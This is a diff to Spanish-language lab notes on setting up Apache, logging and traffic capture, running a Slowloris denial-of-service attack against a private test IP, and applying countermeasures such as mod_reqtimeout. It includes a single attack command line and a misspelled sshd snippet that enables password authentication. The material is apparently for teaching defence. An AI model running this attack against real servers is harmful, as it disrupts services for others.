@@ -3,6 +3,10 @@ sudo apt install curl htop net-tools tcpdump -y
 instalacion de   ---apache---   --- extensiones---
 sudo a2enmod log_config
 sudo systemctl restart apache2
+revisar el fichero para habilitar el ssh:
+nano /etc/ssh/sshd.conf
+passwordAutentication yes
+
 
 activacion de logs detallados    -probarlo->servidor
 sudo a2enmod log_config
@@ -18,6 +22,14 @@ curl -I http://IP_DEL_SERVIDOR
 watch -n 1 "netstat -tn | grep ':80' | wc -l"
 ver el trafico:
 sudo tcpdump -i eth0 port 80 -w captura.pcap
+
+
+lanzar ataque:
+*
+pero./slowloris.pl --dns 192.168.1.100 --port 8080 --timeout 30 --num 300
+
+
+
 
 contramedidas  --este importa--:
 *mod_reqtimeout:
